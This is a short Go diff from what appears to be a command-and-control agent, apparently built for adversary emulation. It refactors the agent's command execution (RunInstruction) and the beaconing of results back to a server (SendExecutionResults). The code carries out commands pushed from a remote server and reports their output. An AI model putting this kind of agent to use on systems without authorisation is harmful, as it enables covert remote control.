@@ -8,9 +8,9 @@ import (
 	"net/http"
 	"path/filepath"
 
-	"../execute"
-	"../util"
+	"../executors/execute"
 	"../output"
+	"../util"
 )
 
 var (
@@ -79,7 +79,7 @@ func (contact API) GetPayloadBytes(payload string, server string, uniqueID strin
 func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
     timeout := int(command["timeout"].(float64))
 	result := make(map[string]interface{})
-	output, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
+	output, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
 	result["id"] = command["id"]
 	result["output"] = output
 	result["status"] = status
@@ -96,7 +96,10 @@ func (contact API) C2RequirementsMet(criteria map[string]string) bool {
 //SendExecutionResults will send the execution results to the server.
 func (contact API) SendExecutionResults(profile map[string]interface{}, result map[string]interface{}) {
 	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
-	profileCopy := profile
+	profileCopy := make(map[string]interface{})
+	for k,v := range profile {
+		profileCopy[k] = v
+	  }
 	profileCopy["result"] = result
 	data, _ := json.Marshal(profileCopy)
 	request(address, data)
